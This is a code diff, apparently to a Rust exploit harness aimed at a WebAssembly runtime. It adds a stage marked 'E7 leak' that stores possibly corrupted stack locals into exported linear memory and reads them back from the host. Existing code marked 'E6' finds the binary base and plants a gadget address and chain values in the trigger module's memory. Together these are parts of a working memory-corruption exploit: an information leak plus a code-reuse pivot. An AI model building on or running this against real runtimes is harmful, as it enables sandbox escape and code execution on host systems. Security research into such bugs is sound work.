@@ -46,7 +46,7 @@ const GIB: usize = 1 << 30;
 const HOLDER_WAT: &str = r#"
 (module
   (import "env" "query" (func $q (param i32) (result i32)))
-  (memory 1)
+  (memory (export "memory") 1)
   (func (export "run") (param $tag i32) (result i32)
     (local $a i64) (local $b i64) (local $c i64) (local $d i64)
     (local.set $a (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1111)))
@@ -55,6 +55,12 @@ const HOLDER_WAT: &str = r#"
     (local.set $d (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x4444)))
     (call $q (local.get $tag))
     drop
+    ;; E7 leak: persist the (possibly batch-corrupted) staged locals to linear memory so the
+    ;; host can read whatever the trigger's write stream put into their spill slots.
+    (i64.store (i32.const 200) (local.get $a))
+    (i64.store (i32.const 208) (local.get $b))
+    (i64.store (i32.const 216) (local.get $c))
+    (i64.store (i32.const 224) (local.get $d))
     (i64.add (i64.add (local.get $a) (local.get $b)) (i64.add (local.get $c) (local.get $d)))
     drop
     (i32.const 0)))
@@ -579,6 +585,7 @@ fn nested(
     NESTED_B_ITERS.store(iters as u64, Ordering::Relaxed);
 
     // E6: plant the runtime pivot (gadget address) + chain values into the trigger's memory
+    let gadget_off = gadget_off.filter(|&o| o != 0);
     let mut gadget_addr: u64 = 0;
     if let Some(goff) = gadget_off {
         let base = find_binary_base();
@@ -663,10 +670,25 @@ fn nested(
         Err(e) => norm_err(e),
     };
     eprintln!("NESTED holder returned: {}", result);
+    // E7 leak: read the persisted staged locals back from the holder's linear memory
+    let mut leak = [0u64; 4];
+    if let Ok(mem) = instance_a.exports.get_memory("memory") {
+        let view = mem.view(&store_a);
+        let mut buf = [0u8; 32];
+        if view.read(200, &mut buf).is_ok() {
+            for k in 0..4 {
+                leak[k] = u64::from_le_bytes(buf[8 * k..8 * k + 8].try_into().unwrap());
+            }
+        }
+    }
+    eprintln!(
+        "NESTED leaked a=0x{:x} b=0x{:x} c=0x{:x} d=0x{:x}",
+        leak[0], leak[1], leak[2], leak[3]
+    );
     let scans = WS_SCANS.lock().map(|v| v.len()).unwrap_or(0);
     println!(
-        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{},\"gadget\":\"0x{:x}\",\"marker\":\"0x{:x}\"}}",
-        trigger_path, iters, result, scans, gadget_addr, marker
+        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{},\"gadget\":\"0x{:x}\",\"marker\":\"0x{:x}\",\"leak\":[\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\"]}}",
+        trigger_path, iters, result, scans, gadget_addr, marker, leak[0], leak[1], leak[2], leak[3]
     );
 }
 
